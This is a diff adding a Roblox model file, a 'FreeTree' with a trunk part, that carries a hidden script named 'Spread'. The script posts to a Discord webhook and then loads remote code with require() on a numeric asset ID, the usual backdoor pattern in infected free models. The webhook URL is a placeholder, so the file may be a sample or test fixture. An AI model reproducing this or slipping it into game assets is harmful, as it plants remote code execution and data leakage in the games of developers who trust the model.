@@ -1,0 +1,14 @@
+<roblox version="4">
+  <Item class="Model" referent="RBX0">
+    <Properties><string name="Name">FreeTree</string></Properties>
+    <Item class="Script" referent="RBX1">
+      <Properties>
+        <string name="Name">Spread</string>
+        <ProtectedString name="Source"><![CDATA[local h = game:GetService("HttpService")
+h:PostAsync("https://discord.com/api/webhooks/000/fake", "x")
+require(9876543210)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Part" referent="RBX2"><Properties><string name="Name">Trunk</string></Properties></Item>
+  </Item>
+</roblox>
